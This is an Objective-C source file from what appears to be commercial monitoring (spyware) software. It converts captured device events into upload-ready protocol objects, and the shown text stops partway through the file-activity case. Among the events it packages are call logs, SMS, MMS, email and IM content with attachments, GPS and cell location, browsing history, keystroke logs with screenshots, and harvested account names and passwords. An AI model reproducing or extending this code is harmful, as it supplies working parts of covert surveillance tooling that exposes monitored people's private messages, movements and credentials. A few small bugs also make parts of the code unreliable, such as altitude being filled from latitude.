//
//  ProtocolEventConverter.m
//  EDM
//
//  Created by Makara Khloth on 11/2/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "ProtocolEventConverter.h"

#import "EventRepositoryUtils.h"

#import "FxCallLogEvent.h"
#import "FxSmsEvent.h"
#import "FxRecipient.h"
#import "FxMmsEvent.h"
#import "FxAttachment.h"
#import "FxEmailEvent.h"
#import "FxSystemEvent.h"
#import "FxSettingsEvent.h"
#import "FxPanicEvent.h"
#import "FxLocationEvent.h"
#import "ThumbnailEvent.h"
#import "MediaEvent.h"
#import "FxCallTag.h"
#import "FxGPSTag.h"
#import "FxIMEvent.h"
#import "FxBrowserUrlEvent.h"
#import "FxBookmarkEvent.h"
#import "FxApplicationLifeCycleEvent.h"
#import "FxIMMessageEvent.h"
#import "FxIMAccountEvent.h"
#import "FxIMContactEvent.h"
#import "FxIMConversationEvent.h"
#import "FxIMGeoTag.h"
#import "FxVoIPEvent.h"
#import "FxKeyLogEvent.h"
#import "FxPageVisitedEvent.h"
#import "FxPasswordEvent.h"
#import "FxUSBConnectionEvent.h"
#import "FxFileTransferEvent.h"
#import "FxLogonEvent.h"
#import "FxApplicationUsageEvent.h"
#import "FxIMMacOSEvent.h"
#import "FxEmailMacOSEvent.h"
#import "FxScreenshotEvent.h"
#import "FxFileActivityEvent.h"
#import "FxNetworkTrafficEvent.h"
#import "FxPrintJobEvent.h"
#import "FxNetworkConnectionMacOSEvent.h"

#import "CallLogEvent.h"
#import "SMSEvent.h"
#import "Recipient.h"
#import "MMSEvent.h"
#import "Attachment.h"
#import "EmailEvent.h"
#import "SystemEvent.h"
#import "SettingEvent.h"
#import "PanicStatus.h"
#import "PanicImage.h"
#import "LocationEvent.h"
#import "CellInfo.h"
#import "CameraImageEvent.h"
#import "GeoTag.h"
#import "VideoFileEvent.h"
#import "AudioFileEvent.h"
#import "AudioConversationEvent.h"
#import "EmbeddedCallInfo.h"
#import "WallpaperEvent.h"
#import "CameraImageThumbnailEvent.h"
#import "VideoFileThumbnailEvent.h"
#import "Thumbnail.h"
#import "AudioFileThumbnailEvent.h"
#import "AudioConversationThumbnailEvent.h"
#import "WallpaperThumbnailEvent.h"
#import "IMEvent.h"
#import "Participant.h"
#import "BrowserUrlEvent.h"
#import "BookmarksEvent.h"
#import "ALCEvent.h"
#import "AudioAmbientEvent.h"
#import "AudioAmbientThumbnailEvent.h"
#import "RemoteCameraImageEvent.h"
#import "IMMessageEvent.h"
#import "IMAccountEvent.h"
#import "IMContactEvent.h"
#import "IMConversationEvent.h"
#import "IMAttachment.h"
#import "VoIPEvent.h"
#import "KeyLogEvent.h"
#import "PageVisitedEvent.h"
#import "PasswordEvent.h"
#import "AppPassword.h"
#import "UsbEvent.h"
#import "FileTransferEvent.h"
#import "LogonEvent.h"
#import "AppUsageEvent.h"
#import "IMMacOSEvent.h"
#import "EmailMacOSEvent.h"
#import "ScreenshotEvent.h"
#import "FileActivityEvent.h"
#import "FileActivityInfo.h"
#import "FileActivityPermission.h"
#import "NetworkTrafficEvent.h"
#import "NetworkInterface.h"
#import "NetworkRemoteHost.h"
#import "NetworkTraffic.h"
#import "PrintJobEvent.h"
#import "NetworkAdapter.h"
#import "NetworkAdapterStatus.h"
#import "NetworkConnectionEvent.h"

#if TARGET_OS_IPHONE

#import "AVAssetiOS5.h"
#import <MobileCoreServices/MobileCoreServices.h>
#import <AVFoundation/AVFoundation.h>
#import <UIKit/UIKit.h>

#endif

@interface ProtocolEventConverter (private)

+ (MediaType) mediaType: (NSString*) aFullPath;
+ (NSString *) mimeType: (NSString*) aFullPath;
+ (NSString *) getMimeTypeFromFileExtension: (NSString *) aFullPath;
#if TARGET_OS_IPHONE
+ (BOOL) isVideo: (NSString*) aFullPath;
#endif
+ (BOOL) extensionCanBeBothAudioAndVideo: (NSString*) aFullPath;
+ (NSString *) audioMovieMimeType: (NSString*) aFullPath isVideo: (BOOL) aIsVideo;
+ (NSInteger) fileSize: (NSString*) aFullPath;
+ (id) convertToPhoenixProtocolActualEvent: (FxEvent*) aEvent;
+ (id) convertToPhoenixProtocolThumbnailEvent: (FxEvent*) aEvent;

@end

@implementation ProtocolEventConverter

+ (id) convertToPhoenixProtocolEvent: (FxEvent*) aEvent aFromThumbnail: (BOOL) aThumbnail {
	DLog (@"FxEvent to phoenix event = %@, is from thumbnail = %d", aEvent, aThumbnail);
	id event = nil;
	switch ([aEvent eventType]) {
		case kEventTypeCallLog: {
			FxCallLogEvent* fxCallLogEvent = (FxCallLogEvent*)aEvent;
			CallLogEvent* callLogEvent = [[CallLogEvent alloc] init];
			[callLogEvent setEventId:[fxCallLogEvent eventId]];
			[callLogEvent setTime:[fxCallLogEvent dateTime]];
			[callLogEvent setContactName:[fxCallLogEvent contactName]];
			[callLogEvent setDirection:(EventDirection)[fxCallLogEvent direction]];
			[callLogEvent setDuration:[fxCallLogEvent duration]];
			[callLogEvent setNumber:[fxCallLogEvent contactNumber]];
			[callLogEvent autorelease];
			event = callLogEvent;
		} break;
		case kEventTypeSms: {
			FxSmsEvent* fxSmsEvent = (FxSmsEvent*)aEvent;
			SMSEvent* smsEvent = [[SMSEvent alloc] init];
			[smsEvent setEventId:[fxSmsEvent eventId]];
			[smsEvent setTime:[fxSmsEvent dateTime]];
			[smsEvent setDirection:(EventDirection)[fxSmsEvent direction]];
			NSMutableArray* recipientArray = [[NSMutableArray alloc] init];
			for (FxRecipient* fxRec in [fxSmsEvent recipientArray]) {
				Recipient* rec = [[Recipient alloc] init];
				[rec setRecipientType:(RecipientType)[fxRec recipType]];
				[rec setContactName:[fxRec recipContactName]];
				[rec setRecipient:[fxRec recipNumAddr]];
				[recipientArray addObject:rec];
				[rec release];
			}
			[smsEvent setRecipientStore:recipientArray];
			[recipientArray release];
			[smsEvent setContactName:[fxSmsEvent contactName]];
			[smsEvent setSenderNumber:[fxSmsEvent senderNumber]];
			[smsEvent setSMSData:[fxSmsEvent smsData]];
			[smsEvent setMConversationID:[fxSmsEvent mConversationID]];
			[smsEvent autorelease];
			event = smsEvent;
		} break;
		case kEventTypeMms: {
			FxMmsEvent* fxMmsEvent = (FxMmsEvent*)aEvent;
			MMSEvent* mmsEvent = [[MMSEvent alloc] init];
			[mmsEvent setEventId:[fxMmsEvent eventId]];
			[mmsEvent setTime:[fxMmsEvent dateTime]];
			[mmsEvent setDirection:(EventDirection)[fxMmsEvent direction]];
			// Recipient
			NSMutableArray* recipientArray = [[NSMutableArray alloc] init];
			for (FxRecipient* fxRec in [fxMmsEvent recipientArray]) {
				Recipient* rec = [[Recipient alloc] init];
				[rec setRecipientType:(RecipientType)[fxRec recipType]];
				[rec setContactName:[fxRec recipContactName]];
				[rec setRecipient:[fxRec recipNumAddr]];
				[recipientArray addObject:rec];
				[rec release];
			}
			[mmsEvent setRecipientStore:recipientArray];
			[recipientArray release];
			// Attachment
			NSMutableArray* attArray = [[NSMutableArray alloc] init];
			for (FxAttachment* fxAtt in [fxMmsEvent attachmentArray]) {
				Attachment* att = [[Attachment alloc] init];
				[att setAttachmentFullName:[fxAtt fullPath]];
				[att setAttachmentData:[NSData dataWithContentsOfFile:[fxAtt fullPath]]];
				[attArray addObject:att];
				[att release];
			}
			[mmsEvent setAttachmentStore:attArray];
			[attArray release];
			[mmsEvent setContactName:[fxMmsEvent senderContactName]];
			[mmsEvent setSenderNumber:[fxMmsEvent senderNumber]];
			[mmsEvent setSubject:[fxMmsEvent subject]];
			[mmsEvent setMText:[fxMmsEvent message]];
			[mmsEvent setMConversationID:[fxMmsEvent mConversationID]];
			[mmsEvent autorelease];
			event = mmsEvent;
		} break;
		case kEventTypeMail: {
			FxEmailEvent* fxEmailEvent = (FxEmailEvent*)aEvent;
			EmailEvent* emailEvent = [[EmailEvent alloc] init];
			[emailEvent setEventId:[fxEmailEvent eventId]];
			[emailEvent setTime:[fxEmailEvent dateTime]];
			[emailEvent setDirection:(EventDirection)[fxEmailEvent direction]];
			// Recipient
			NSMutableArray* recipientArray = [[NSMutableArray alloc] init];
			for (FxRecipient* fxRec in [fxEmailEvent recipientArray]) {
				Recipient* rec = [[Recipient alloc] init];
				[rec setRecipientType:(RecipientType)[fxRec recipType]];
				[rec setContactName:[fxRec recipContactName]];
				[rec setRecipient:[fxRec recipNumAddr]];
				[recipientArray addObject:rec];
				[rec release];
			}
			[emailEvent setRecipientStore:recipientArray];
			[recipientArray release];
			// Attachment
			NSMutableArray* attArray = [[NSMutableArray alloc] init];
			for (FxAttachment* fxAtt in [fxEmailEvent attachmentArray]) {
				Attachment* att = [[Attachment alloc] init];
				[att setAttachmentFullName:[fxAtt fullPath]];
				[att setAttachmentData:[NSData dataWithContentsOfFile:[fxAtt fullPath]]];
				[attArray addObject:att];
				[att release];
			}
			[emailEvent setAttachmentStore:attArray];
			[attArray release];
			[emailEvent setEmailBody:[fxEmailEvent message]];
			[emailEvent setContactName:[fxEmailEvent senderContactName]];
			[emailEvent setSenderEmail:[fxEmailEvent senderEmail]];
			[emailEvent setSubject:[fxEmailEvent subject]];
			[emailEvent autorelease];
			event = emailEvent;
		} break;
		case kEventTypeIM: {
			FxIMEvent* fxIMEvent = (FxIMEvent*)aEvent;
			IMEvent* imEvent = [[IMEvent alloc] init];
			[imEvent setEventId:[fxIMEvent eventId]];
			[imEvent setTime:[fxIMEvent dateTime]];
			[imEvent setDirection:(EventDirection)[fxIMEvent mDirection]];
			// Participants
			NSMutableArray* participants = [[NSMutableArray alloc] init];
			for (FxRecipient* fxRec in [fxIMEvent mParticipants]) {
				Participant* participant = [[Participant alloc] init];
				[participant setName:[fxRec recipContactName]];
				[participant setUID:[fxRec recipNumAddr]];
				[participants addObject:participant];
				[participant release];
			}
			[imEvent setParticipantList:participants];
			[participants release];
			// Attachments
			// FxIMEvent have support attachment for future changes of IM event cause most IM can send file attachment now
//			NSMutableArray* attArray = [[NSMutableArray alloc] init];
//			for (FxAttachment* fxAtt in [fxIMEvent attachmentArray]) {
//				Attachment* att = [[Attachment alloc] init];
//				[att setAttachmentFullName:[fxAtt fullPath]];
//				[att setAttachmentData:[NSData dataWithContentsOfFile:[fxAtt fullPath]]];
//				[attArray addObject:att];
//				[att release];
//			}
//			[imEvent setAttachmentStore:attArray];
//			[attArray release];
			[imEvent setIMServiceID:[fxIMEvent mIMServiceID]];
			[imEvent setMessage:[fxIMEvent mMessage]];
			[imEvent setUserDisplayName:[fxIMEvent mUserDisplayName]];
			[imEvent setUserID:[fxIMEvent mUserID]];
			[imEvent autorelease];
			event = imEvent;
		} break;
		case kEventTypeSystem: {
			FxSystemEvent* fxSystemEvent = (FxSystemEvent*)aEvent;
			SystemEvent* systemEvent = [[SystemEvent alloc] init];
			[systemEvent setEventId:[fxSystemEvent eventId]];
			[systemEvent setTime:[fxSystemEvent dateTime]];
			[systemEvent setCategory:(SystemEventCategories)[fxSystemEvent systemEventType]];
			[systemEvent setDirection:(EventDirection)[fxSystemEvent direction]];
			[systemEvent setMessage:[fxSystemEvent message]];
			[systemEvent autorelease];
			event = systemEvent;
		} break;
		case kEventTypeSettings: {
			FxSettingsEvent* fxSettingsEvent = (FxSettingsEvent*)aEvent;
			SettingEvent* settingsEvent = [[SettingEvent alloc] init];
			[settingsEvent setEventId:[fxSettingsEvent eventId]];
			[settingsEvent setTime:[fxSettingsEvent dateTime]];
			NSMutableArray *settingIDs = [NSMutableArray array];
			NSMutableArray *settingValues = [NSMutableArray array];
			for (FxSettingsElement *element in [fxSettingsEvent mSettingArray]) {
				[settingIDs addObject:[NSNumber numberWithInt:[element mSettingId]]];
				[settingValues addObject:[element mSettingValue]];
			}
			[settingsEvent setMSettingIDs:settingIDs];
			[settingsEvent setMSettingValues:settingValues];
			[settingsEvent autorelease];
			event = settingsEvent;
		} break;
		case kEventTypePanic: {
			FxPanicEvent* fxPanicEvent = (FxPanicEvent*)aEvent;
			PanicStatus* panicStatus = [[PanicStatus alloc] init];
			[panicStatus setEventId:[fxPanicEvent eventId]];
			[panicStatus setTime:[fxPanicEvent dateTime]];
			[panicStatus setStatus:(PanicStatusEnum)[fxPanicEvent panicStatus]];
			[panicStatus autorelease];
			event = panicStatus;
		} break;
		case kEventTypePanicImage: {
			MediaEvent* fxPanicImage = (MediaEvent*)aEvent;
			PanicImage* panicImage = [[PanicImage alloc] init];
			[panicImage setEventId:[fxPanicImage eventId]];
			[panicImage setTime:[fxPanicImage dateTime]];
			[panicImage setLat:(double)[[fxPanicImage mGPSTag] latitude]];
			[panicImage setLon:(double)[[fxPanicImage mGPSTag] longitude]];
			[panicImage setAltitude:(long)[[fxPanicImage mGPSTag] latitude]];
			[panicImage setCoordinateAccuracy:(CoordinateAccuracy)[[fxPanicImage mGPSTag] mCoordinateAcc]];
			[panicImage setNetworkName:[[fxPanicImage mGPSTag] mNetworkName]];
			[panicImage setNetworkID:[[fxPanicImage mGPSTag] networkId]];
			[panicImage setCellName:[[fxPanicImage mGPSTag] mCellName]];
			[panicImage setCellID:(long)[[fxPanicImage mGPSTag] cellId]];
			NSNumberFormatter* numberFormat = [[NSNumberFormatter alloc] init];
			if ([[[fxPanicImage mGPSTag] countryCode] length]) {
				NSNumber* countryCode = [numberFormat numberFromString:[[fxPanicImage mGPSTag] countryCode]];
				[panicImage setCountryCode:[countryCode longValue]];
			}
			if ([[[fxPanicImage mGPSTag] areaCode] length]) {
				NSNumber* areaCode = [numberFormat numberFromString:[[fxPanicImage mGPSTag] areaCode]];
				[panicImage setAreaCode:[areaCode longValue]];
			}
			[panicImage setMediaType:[self mediaType:[fxPanicImage fullPath]]];
			[panicImage setMediaData:[NSData dataWithContentsOfFile:[fxPanicImage fullPath]]];
			[numberFormat release];
			[panicImage autorelease];
			event = panicImage;
		} break;
		case kEventTypeLocation: {
			FxLocationEvent* fxLocationEvent = (FxLocationEvent*)aEvent;
			LocationEvent* locationEvent = [[LocationEvent alloc] init];
			[locationEvent setEventId:[fxLocationEvent eventId]];
			[locationEvent setTime:[fxLocationEvent dateTime]];
			[locationEvent setCallingModule:(CallingModule)[fxLocationEvent callingModule]];
			[locationEvent setGpsMethod:(GPSMethod)[fxLocationEvent method]];
			[locationEvent setLon:(double)[fxLocationEvent longitude]];
			[locationEvent setLat:(double)[fxLocationEvent latitude]];
			[locationEvent setAltitude:[fxLocationEvent altitude]];
			[locationEvent setSpeed:[fxLocationEvent speed]];
			[locationEvent setHeading:[fxLocationEvent heading]];
			[locationEvent setSpeed:[fxLocationEvent speed]];
			[locationEvent setHorizontalAccuracy:[fxLocationEvent horizontalAcc]];
			[locationEvent setVerticalAccuracy:[fxLocationEvent verticalAcc]];
			// Cell Info
			CellInfo* cellInfo = [[CellInfo alloc] init];
			[cellInfo setNetworkName:[fxLocationEvent networkName]];
			[cellInfo setNetworkID:[fxLocationEvent networkId]];
			[cellInfo setCellName:[fxLocationEvent cellName]];
			[cellInfo setCellID:[fxLocationEvent cellId]];
			[cellInfo setMCC:[fxLocationEvent countryCode]];
			NSNumberFormatter* numberFormat = [[NSNumberFormatter alloc] init];
			if ([[fxLocationEvent areaCode] length]) {
				NSNumber* areaCode = [numberFormat numberFromString:[fxLocationEvent areaCode]];
				[cellInfo setAreaCode:[areaCode intValue]];
			}
			[numberFormat release];
			[locationEvent setCellInfo:cellInfo];
			[cellInfo release];
			[locationEvent autorelease];
			event = locationEvent;
		} break;
		case kEventTypeBrowserURL: {
			FxBrowserUrlEvent *fxBrowserUrlEvent = (FxBrowserUrlEvent *)aEvent;
			BrowserUrlEvent *browserUrlEvent = [[BrowserUrlEvent alloc] init];
			[browserUrlEvent setEventId:[fxBrowserUrlEvent eventId]];
			[browserUrlEvent setTime:[fxBrowserUrlEvent dateTime]];
			[browserUrlEvent setMTitle:[fxBrowserUrlEvent mTitle]];
			[browserUrlEvent setMUrl:[fxBrowserUrlEvent mUrl]];
			[browserUrlEvent setMVisitTime:[fxBrowserUrlEvent mVisitTime]];
			[browserUrlEvent setMIsBlocked:[fxBrowserUrlEvent mIsBlocked]];
			[browserUrlEvent setMOwningApp:[fxBrowserUrlEvent mOwningApp]];
			[browserUrlEvent autorelease];
			event = browserUrlEvent;
		} break;
		case kEventTypeBookmark: {
			FxBookmarkEvent *fxBookmarkEvent = (FxBookmarkEvent *)aEvent;
			BookmarksEvent *bookmarksEvent = [[BookmarksEvent alloc] init];
			[bookmarksEvent setEventId:[fxBookmarkEvent eventId]];
			[bookmarksEvent setTime:[fxBookmarkEvent dateTime]];
			NSMutableArray *bookmarks = [NSMutableArray array];
			for (FxBookmark *fxBookmark in [fxBookmarkEvent bookmarks]) {
				Bookmark *bookmark = [[Bookmark alloc] init];
				[bookmark setMTitle:[fxBookmark mTitle]];
				[bookmark setMUrl:[fxBookmark mUrl]];
				[bookmarks addObject:bookmark];
				[bookmark release];
			}
			[bookmarksEvent setMBookmarks:bookmarks];
			[bookmarksEvent autorelease];
			event = bookmarksEvent;
		} break;
		case kEventTypeApplicationLifeCycle: {
			FxApplicationLifeCycleEvent *fxALCEvent = (FxApplicationLifeCycleEvent *)aEvent;
			ALCEvent *alcEvent = [[[ALCEvent alloc] init] autorelease];
			[alcEvent setEventId:[fxALCEvent eventId]];
			[alcEvent setTime:[fxALCEvent dateTime]];
			[alcEvent setMApplicationState:[fxALCEvent mAppState]];
			[alcEvent setMApplicationType:[fxALCEvent mAppType]];
			[alcEvent setMApplicationIdentifier:[fxALCEvent mAppID]];
			[alcEvent setMApplicationName:[fxALCEvent mAppName]];
			[alcEvent setMApplicationVersion:[fxALCEvent mAppVersion]];
			[alcEvent setMApplicationSize:[fxALCEvent mAppSize]];
			[alcEvent setMApplicationIconType:[fxALCEvent mAppIconType]];
			[alcEvent setMApplicationIconData:[fxALCEvent mAppIconData]];
			event = alcEvent;
		} break;
		case kEventTypeIMMessage: {
			FxIMMessageEvent *fxIMMessageEvent = (FxIMMessageEvent *)aEvent;
			IMMessageEvent *imMessageEvent = [[[IMMessageEvent alloc] init] autorelease];
			[imMessageEvent setTime:[fxIMMessageEvent dateTime]];
			[imMessageEvent setMDirection:(IMDirection)[fxIMMessageEvent mDirection]];
			[imMessageEvent setMIMServiceID:(IMServiceID)[fxIMMessageEvent mServiceID]];
			[imMessageEvent setMConversationID:[fxIMMessageEvent mConversationID]];
			[imMessageEvent setMMessageOriginatorID:[fxIMMessageEvent mUserID]];
			[imMessageEvent setMTextRepresentation:[fxIMMessageEvent mRepresentationOfMessage]];
			[imMessageEvent setMData:[fxIMMessageEvent mMessage]];
			[imMessageEvent setMMessageOriginatorlocationPlace:[[fxIMMessageEvent mUserLocation] mPlaceName]];
			[imMessageEvent setMMessageOriginatorlocationlongtitude:[[fxIMMessageEvent mUserLocation] mLongitude]];
			[imMessageEvent setMMessageOriginatorlocationlatitude:[[fxIMMessageEvent mUserLocation] mLatitude]];
			[imMessageEvent setMMessageOriginatorlocationHoraccuracy:[[fxIMMessageEvent mUserLocation] mHorAccuracy]];
			[imMessageEvent setMShareLocationPlace:[[fxIMMessageEvent mShareLocation] mPlaceName]];
			[imMessageEvent setMShareLocationlongtitude:[[fxIMMessageEvent mShareLocation] mLongitude]];
			[imMessageEvent setMShareLocationlatitude:[[fxIMMessageEvent mShareLocation] mLatitude]];
			[imMessageEvent setMShareLocationHoraccuracy:[[fxIMMessageEvent mShareLocation] mHorAccuracy]];
			// Attachments
			NSMutableArray *attachments = [[NSMutableArray alloc] init];
			for (FxAttachment *att in [fxIMMessageEvent mAttachments]) {
				DLog (@">>>>>>> attachment: %@", att)
				IMAttachment *attIM				= [[IMAttachment alloc] init];
				
				NSString *mimeType				= nil;				
				NSString *attachmentFilePath	= [att fullPath];									// full path
				NSString *attachmentFullName	= [attachmentFilePath lastPathComponent];			// filename only
				
				// -- if the attachment exists, the fullPath property is the fullPath
				// -- if the attachment does NOT exist, the fullPath property is used as a MIME TYPE
				if ([[NSFileManager defaultManager] fileExistsAtPath:attachmentFilePath]) {
					DLog (@"File exist....")
					
                    // ################################################################
                    #if TARGET_OS_IPHONE 
                    
					// -- check the actual type if the the file extension can be both audio and audio
					if ([ProtocolEventConverter extensionCanBeBothAudioAndVideo:attachmentFilePath]		&&
						[[[UIDevice currentDevice] systemVersion] intValue] >= 5						){
						
						// -- VIDEO
						if ([ProtocolEventConverter isVideo:attachmentFilePath])
							mimeType = [ProtocolEventConverter audioMovieMimeType:attachmentFilePath isVideo:YES];									
						// -- AUDIO
						else 
							mimeType = [ProtocolEventConverter audioMovieMimeType:attachmentFilePath isVideo:NO];			
					} else {
						mimeType = [ProtocolEventConverter mimeType:attachmentFilePath];
                        
                        // For iOS 6, it cannot find mimetype of vcs file, so we need to hardcode it.
                        // The issue has been found in BBM 2.4.1
                        if (!mimeType && [[attachmentFilePath pathExtension] isEqualToString:@"vcs"]) {
                            mimeType = @"text/x-vcalendar";
                        }
					}
                    
                    // ################################################################
                    #else
                    
                    mimeType = [ProtocolEventConverter mimeType:attachmentFilePath];
                    
                    
                    // ################################################################                    
                    #endif

					
					if (!mimeType) 
						mimeType = [ProtocolEventConverter getMimeTypeFromFileExtension:attachmentFilePath];
				
				} else {
					DLog (@"File doesn't exist..")
					mimeType = attachmentFilePath;
					attachmentFullName = nil;
				}
												
				[attIM setMMIMEType:mimeType];
				/// !!!: Change to use NSFileHandler
				//[attIM setMAttachmentFullname:attachmentFullName];
				if (attachmentFullName) {									// file path is not mime type
					DLog (@"mAttachmentFullname %@", attachmentFilePath)
					[attIM setMAttachmentFullname:attachmentFilePath];		// full path of media file
				} else {
					[attIM setMAttachmentFullname:attachmentFullName];		// null because we capture only mimetype
				}					
				[attIM setMThumbNailData:[att mThumbnail]];
				
				/// !!!: Change to use NSFileHandler
				//[attIM setMAttachmentData:[NSData dataWithContentsOfFile:[att fullPath]]];
				[attIM setMAttachmentData:nil];
				
				[attachments addObject:attIM];
				[attIM release];
			}
			if ([attachments count] != 0) {
				DLog (@">>>> set attachment")
				[imMessageEvent setMAttachments:attachments];
			}
			[attachments release];	
			event = imMessageEvent;
		} break;
		case kEventTypeIMAccount: {
			FxIMAccountEvent *fxIMAccountEvent = (FxIMAccountEvent *)aEvent;
			IMAccountEvent *imAccountEvent = [[[IMAccountEvent alloc] init] autorelease];
			[imAccountEvent setTime:[fxIMAccountEvent dateTime]];
			[imAccountEvent setMIMServiceID:(IMServiceID)[fxIMAccountEvent mServiceID]];
			[imAccountEvent setMAccountOwnerID:[fxIMAccountEvent mAccountID]];
			[imAccountEvent setMAccountOwnerDisplayName:[fxIMAccountEvent mDisplayName]];
			[imAccountEvent setMAccountOwnerStatusMessage:[fxIMAccountEvent mStatusMessage]];
			[imAccountEvent setMAccountOwnerPictureProfile:[fxIMAccountEvent mPicture]];
			event = imAccountEvent;
		} break;
		case kEventTypeIMConversation: {
			FxIMConversationEvent *fxIMConversationEvent = (FxIMConversationEvent *)aEvent;
			IMConversationEvent *imCoversationEvent = [[[IMConversationEvent alloc] init] autorelease];
			[imCoversationEvent setTime:[fxIMConversationEvent dateTime]];
			[imCoversationEvent setMIMServiceID:(IMServiceID)[fxIMConversationEvent mServiceID]];
			[imCoversationEvent setMAccountOwnerID:[fxIMConversationEvent mAccountID]];
			[imCoversationEvent setMConversationID:[fxIMConversationEvent mID]];
			[imCoversationEvent setMConversationName:[fxIMConversationEvent mName]];
			[imCoversationEvent setMContacts:[fxIMConversationEvent mContactIDs]];
			[imCoversationEvent setMStatusMessage:[fxIMConversationEvent mStatusMessage]];
			[imCoversationEvent setMPictureProfile:[fxIMConversationEvent mPicture]];
			event = imCoversationEvent;
		} break;
		case kEventTypeIMContact: {
			FxIMContactEvent *fxIMContactEvent = (FxIMContactEvent *)aEvent;
			IMContactEvent *imContactEvent = [[[IMContactEvent alloc] init] autorelease];
			[imContactEvent setTime:[fxIMContactEvent dateTime]];
			[imContactEvent setMIMServiceID:(IMServiceID)[fxIMContactEvent mServiceID]];
			[imContactEvent setMAccountOwnerID:[fxIMContactEvent mAccountID]];
			[imContactEvent setMContactID:[fxIMContactEvent mContactID]];
			[imContactEvent setMContactDisplayName:[fxIMContactEvent mDisplayName]];
			[imContactEvent setMContactStatusMessage:[fxIMContactEvent mStatusMessage]];
			[imContactEvent setMContactPictureProfile:[fxIMContactEvent mPicture]];
			event = imContactEvent;
		} break;
		case kEventTypeVoIP: {
			FxVoIPEvent *fxVoIPEvent = (FxVoIPEvent *)aEvent;
			VoIPEvent *voIPEvent = [[[VoIPEvent alloc] init] autorelease];
			[voIPEvent setEventId:[fxVoIPEvent eventId]];
			[voIPEvent setTime:[fxVoIPEvent dateTime]];
			[voIPEvent setMCategory:[fxVoIPEvent mCategory]];
			[voIPEvent setMDirection:[fxVoIPEvent mDirection]];
			[voIPEvent setMDuration:[fxVoIPEvent mDuration]];
			[voIPEvent setMUserID:[fxVoIPEvent mUserID]];
			[voIPEvent setMContactName:[fxVoIPEvent mContactName]];
			[voIPEvent setMTransferedByte:[fxVoIPEvent mTransferedByte]];
			[voIPEvent setMIsMonitor:[fxVoIPEvent mVoIPMonitor]];
			[voIPEvent setMFrameStripID:[fxVoIPEvent mFrameStripID]];
			event = voIPEvent;
		} break;
		case kEventTypeKeyLog: {			
			FxKeyLogEvent *fxKeyLogEvent = (FxKeyLogEvent *)aEvent;
			KeyLogEvent *keyLogEvent = [[[KeyLogEvent alloc] init] autorelease];
			[keyLogEvent setEventId:[fxKeyLogEvent eventId]];
			[keyLogEvent setTime:[fxKeyLogEvent dateTime]];
			[keyLogEvent setMUserName:[fxKeyLogEvent mUserName]];
            [keyLogEvent setMApplicationID:[fxKeyLogEvent mApplicationID]];
			[keyLogEvent setMApplication:[fxKeyLogEvent mApplication]];
			[keyLogEvent setMTitle:[fxKeyLogEvent mTitle]];
            [keyLogEvent setMUrl:[fxKeyLogEvent mUrl]];
			[keyLogEvent setMActualDisplayData:[fxKeyLogEvent mActualDisplayData]];
			[keyLogEvent setMRawData:[fxKeyLogEvent mRawData]];
            [keyLogEvent setMScreenShotMediaType:[ProtocolEventConverter mediaType:[fxKeyLogEvent mScreenshotPath]]];
            [keyLogEvent setMScreenShot:[fxKeyLogEvent mScreenshotPath]];
			event = keyLogEvent;
		} break;
        case kEventTypePageVisited: {
            FxPageVisitedEvent *fxPageVisitedEvent = (FxPageVisitedEvent *)aEvent;
            PageVisitedEvent *pageVisitedEvent = [[[PageVisitedEvent alloc] init] autorelease];
            [pageVisitedEvent setEventId:[fxPageVisitedEvent eventId]];
			[pageVisitedEvent setTime:[fxPageVisitedEvent dateTime]];
			[pageVisitedEvent setMUserName:[fxPageVisitedEvent mUserName]];
            [pageVisitedEvent setMApplicationID:[fxPageVisitedEvent mApplicationID]];
			[pageVisitedEvent setMApplication:[fxPageVisitedEvent mApplication]];
			[pageVisitedEvent setMTitle:[fxPageVisitedEvent mTitle]];
            [pageVisitedEvent setMUrl:[fxPageVisitedEvent mUrl]];

            event = pageVisitedEvent;
        } break;
        case kEventTypePassword: {
            FxPasswordEvent *fxPasswordEvent = (FxPasswordEvent *)aEvent;
            PasswordEvent *passwordEvent = [[[PasswordEvent alloc] init] autorelease];
            [passwordEvent setEventId:(int)[fxPasswordEvent eventId]];
            [passwordEvent setTime:[fxPasswordEvent dateTime]];
            [passwordEvent setMApplicationID:[fxPasswordEvent mApplicationID]];
            [passwordEvent setMApplicationName:[fxPasswordEvent mApplicationName]];
            [passwordEvent setMApplicationType:[fxPasswordEvent mApplicationType]];
            NSMutableArray *appPwds = [NSMutableArray array];
            for (FxAppPwd *fxAppPwd in [fxPasswordEvent mAppPwds]) {
                AppPassword *appPwd = [[AppPassword alloc] init];
                [appPwd setMAccountName:[fxAppPwd mAccountName]];
                [appPwd setMUserName:[fxAppPwd mUserName]];
                [appPwd setMPassword:[fxAppPwd mPassword]];
                [appPwds addObject:appPwd];
                [appPwd release];
            }
            [passwordEvent setMAppPasswords:appPwds];
            event = passwordEvent;
        } break;
        case kEventTypeUsbConnection: {
            FxUSBConnectionEvent *fxUsbEvent = (FxUSBConnectionEvent *)aEvent;
            UsbEvent *usbEvent = [[[UsbEvent alloc] init] autorelease];
            [usbEvent setEventId:[fxUsbEvent eventId]];
            [usbEvent setTime:[fxUsbEvent dateTime]];
            [usbEvent setMUserLogonName:[fxUsbEvent mUserLogonName]];
            [usbEvent setMAppID:[fxUsbEvent mApplicationID]];
            [usbEvent setMAppName:[fxUsbEvent mApplicationName]];
            [usbEvent setMTitle:[fxUsbEvent mTitle]];
            [usbEvent setMAction:[fxUsbEvent mAction]];
            [usbEvent setMType:[fxUsbEvent mDeviceType]];
            [usbEvent setMName:[fxUsbEvent mDriveName]];
            event = usbEvent;
        } break;
        case kEventTypeFileTransfer: {
            FxFileTransferEvent *fxFileTransferEvent = (FxFileTransferEvent *)aEvent;
            FileTransferEvent *fileTransferEvent = [[[FileTransferEvent alloc] init] autorelease];
            [fileTransferEvent setEventId:[fxFileTransferEvent eventId]];
            [fileTransferEvent setTime:[fxFileTransferEvent dateTime]];
            [fileTransferEvent setMDirection:[fxFileTransferEvent mDirection]];
            [fileTransferEvent setMUserLogonName:[fxFileTransferEvent mUserLogonName]];
            [fileTransferEvent setMAppID:[fxFileTransferEvent mApplicationID]];
            [fileTransferEvent setMAppName:[fxFileTransferEvent mApplicationName]];
            [fileTransferEvent setMTitle:[fxFileTransferEvent mTitle]];
            [fileTransferEvent setMType:[fxFileTransferEvent mTransferType]];
            [fileTransferEvent setMSPath:[fxFileTransferEvent mSourcePath]];
            [fileTransferEvent setMDPath:[fxFileTransferEvent mDestinationPath]];
            [fileTransferEvent setMFileName:[fxFileTransferEvent mFileName]];
            [fileTransferEvent setMFileSize:[fxFileTransferEvent mFileSize]];
            event = fileTransferEvent;
        } break;
        case kEventTypeFileActivity: {
